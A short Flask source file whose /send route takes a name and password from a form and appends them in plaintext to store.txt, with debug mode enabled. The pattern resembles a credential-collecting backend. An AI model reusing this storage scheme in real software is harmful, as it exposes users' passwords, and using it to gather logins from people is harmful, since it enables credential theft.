from flask import Flask, render_template, request
app = Flask(__name__)

@app.route('/')
def home():
    return render_template("index.html")

@app.route("/send" , methods=["POST"])
def send():
    name = request.form["name"]
    password = request.form["password"]

    data = open("store.txt","a")
    data.write("Name: ")
    data.write(name)
    data.write(" --Password: ")
    data.write(password)
    data.write(", ")
    data.close()
    return "Submited successfully"

if __name__ == "__main__":
    app.run(debug=True)